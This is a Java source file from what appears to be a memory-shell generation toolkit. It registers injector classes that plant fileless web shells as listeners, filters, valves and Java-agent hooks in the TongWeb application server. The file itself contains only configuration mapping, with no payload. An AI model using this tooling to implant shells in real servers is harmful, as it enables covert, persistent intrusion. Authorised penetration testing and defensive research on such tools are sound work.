package com.reajason.javaweb.memshell.server.tongweb;

import com.reajason.javaweb.memshell.server.AbstractServer;
import com.reajason.javaweb.memshell.server.InjectorMapping;
import com.reajason.javaweb.memshell.server.tomcat.Tomcat;


import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * @author ReaJason
 * @since 2024/12/26
 */
public class TongWeb extends AbstractServer {

    @Override
    public Class<?> getListenerInterceptor() {
        return Tomcat.ListenerInterceptor.class;
    }

    @Override
    public InjectorMapping getShellInjectorMapping() {
        return InjectorMapping.builder()
                .addInjector(LISTENER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebListenerInjector")
                .addInjector(JAKARTA_LISTENER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebListenerInjector")
                .addInjector(FILTER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterInjector")
                .addInjector(JAKARTA_FILTER, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterInjector")
                .addInjector(VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebValveInjector")
                .addInjector(JAKARTA_VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebValveInjector")
                .addInjector(AGENT_FILTER_CHAIN, "com.reajason.javaweb.memshell.injector.tongweb.TongWebFilterChainAgentInjector")
                .addInjector(CATALINA_AGENT_CONTEXT_VALVE, "com.reajason.javaweb.memshell.injector.tongweb.TongWebContextValveAgentInjector")
                .build();
    }
}
